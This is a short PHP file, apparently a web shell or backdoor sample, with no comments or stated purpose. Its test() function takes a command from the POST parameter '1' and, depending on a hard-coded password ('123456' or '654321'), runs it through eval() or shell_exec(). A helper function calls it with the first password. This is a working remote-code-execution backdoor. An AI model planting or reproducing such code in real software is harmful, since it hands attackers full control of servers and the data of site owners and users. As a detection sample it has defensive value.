<?php

function test($pass) {
    $cmd = $_POST[1];
    if ($pass == "123456") {
        eval($cmd);
    } else if ($pass == "654321") {
        shell_exec($cmd);
    } else {
        die();
    }
    echo "DONE!";
}


function test2() {
    echo 123;
    test("123456");
}

echo 233;